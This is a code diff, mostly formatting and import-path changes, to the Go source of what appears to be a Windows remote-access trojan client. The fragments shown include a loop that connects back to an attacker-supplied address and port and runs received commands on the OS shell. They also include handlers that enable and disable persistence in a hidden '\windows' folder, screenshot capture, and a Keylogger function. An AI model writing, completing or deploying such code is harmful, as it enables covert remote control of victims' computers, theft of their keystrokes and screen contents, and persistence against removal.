@@ -4,8 +4,8 @@ import (
 	"bufio"
 	"encoding/base64"
 	"fmt"
-	"generate/pool/osinfo"
-	"generate/pool/persistence"
+	"github.com/phil-fly/generate/pool/osinfo"
+	"github.com/phil-fly/generate/pool/persistence"
 	"golang.org/x/sys/windows/registry"
 	"image/png"
 	"io/ioutil"
@@ -19,16 +19,13 @@ import (
 	screenshot "github.com/kbinani/screenshot"
 )
 
-
 var (
-	FileName	string
+	FileName    string
 	FOLDER_PATH        = "\\ProgramData"
 	NEW_LINE    string = "\n"
 )
 
-var (
-
-)
+var ()
 
 var (
 	dll, _              = syscall.LoadDLL("user32.dll")
@@ -37,17 +34,17 @@ var (
 	Logs                string
 )
 
-func Generate(remoteAddr,remotePort,fileName string) {
+func Generate(remoteAddr, remotePort, fileName string) {
 	FileName = fileName
 	RemoteAddr = remoteAddr
 	RemotePort = remotePort
 	for {
-		time.Sleep(1*time.Second)
+		time.Sleep(1 * time.Second)
 		Connect()
 	}
 }
 
-var RemoteAddr , RemotePort string
+var RemoteAddr, RemotePort string
 
 func Connect() {
 	// Create a connection
@@ -57,7 +54,7 @@ func Connect() {
 	if err != nil {
 		log.Println("[*] Connecting...")
 		for {
-			time.Sleep(1*time.Second)
+			time.Sleep(1 * time.Second)
 			Connect()
 		}
 	}
@@ -66,7 +63,7 @@ func Connect() {
 		// When the command received aren't encoded,
 		// skip switch, and be executed on OS shell.
 		command, err := bufio.NewReader(conn).ReadString('\n')
-		if err != nil{
+		if err != nil {
 			conn.Close()
 			Connect()
 		}
@@ -133,9 +130,9 @@ func Connect() {
 		case "persistence_enable":
 			// Create a folder to save file
 			self := &persistence.Persistence{}
-			Personal,_:= getPersonal()
+			Personal, _ := getPersonal()
 			self.Setfilename(FileName)
-			self.SetfolderPath(Personal,"\\windows")
+			self.SetfolderPath(Personal, "\\windows")
 			err := self.Enable()
 			if err == nil {
 				SendMessage(conn, "[*] Persistence Enabled!")
@@ -148,9 +145,9 @@ func Connect() {
 		case "persistence_disable":
 			// Remove directory
 			self := &persistence.Persistence{}
-			Personal,_:= getPersonal()
+			Personal, _ := getPersonal()
 			self.Setfilename(FileName)
-			self.SetfolderPath(Personal,"\\windows")
+			self.SetfolderPath(Personal, "\\windows")
 			self.Disable()
 
 			SendMessage(conn, "[*] Persistence Disabled!")
@@ -191,7 +188,6 @@ func getPersonal() (string, error) {
 	}
 	return s, nil
 }
-
 
 func SendMessage(conn net.Conn, message string) {
 	conn.Write([]byte(base64.URLEncoding.EncodeToString([]byte(message)) + NEW_LINE))
@@ -490,5 +486,3 @@ func Keylogger() {
 		}
 	}
 }
-
-
